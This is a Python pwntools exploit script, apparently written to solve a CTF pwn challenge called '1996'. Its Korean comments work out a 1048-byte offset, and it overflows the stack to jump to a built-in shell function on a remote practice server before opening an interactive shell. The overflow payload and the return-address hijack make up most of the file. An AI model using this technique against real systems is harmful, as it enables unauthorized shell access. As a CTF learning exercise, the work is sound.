#! -*- coding: utf-8 -*-
from pwn import * 
# C++ 바이너리. 문자열을 입력받아 같은 이름을 가진 환경변수의 값을 출력한다. 
# 0x7fffffffdf80 위치에 입력을 받기 시작하고, ebp는 0x7fffffffe398 , 0x418 -> 1048 거리.
# 64비트, c++ 라이브러리임을 생각하고, 일단 스택주소는 고정이 아니다. 
# 스택주소를 leak 하고 스택에 쉘코드를 올려 실행시키는 방식인가? 
# 일단 스택 스택 특정 위치의 주소가 있긴 있엇다. 인자는 rsi에 들어가는 방식. 
# 출력함수 구간으로 들어가서 스택의 주소 leak ->  입력구간으로 들어가서 쉘코드 올리고 rip에 쉘코드 주소 넣기. 
# 원하는 값이 +16 위치에 있어서 pop을 한번 더 해야된다. 
# 주소값 입력이 제대로 안들어가고있다. 이런 형태로는 입력이 안되는듯. 
# 프로그램 전체 흐름을 보자. 출력하고, 입력받고, 입력받은값 출력하고 , "=" 기호 출력하고, getenv로 환경변수를 받아온다.
# 그냥 쉘 호출 함수가 있었다.. 뻘짓잼. 

p_ret = 0x0400a32		# pop r15 ; ret
p_rsi_p_ret = 0x0400a31 # pop rsi ; pop r15 ; ret
cout = 0x000000000040090c 		# rdi 인자 lea 후 cout 실행. 
shell = 0x0000000000400897 

#p = process("./1996")
p = remote("ctf.j0n9hyun.xyz",3013)
#p64(p_ret) + p64(p_rsi_p_ret) + 
payload = "a"*1048
payload += p64(shell) 
#payload += p64(cout) 
#payload += "\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB" 

pause()
p.sendlineafter("read? ",payload)

p.interactive()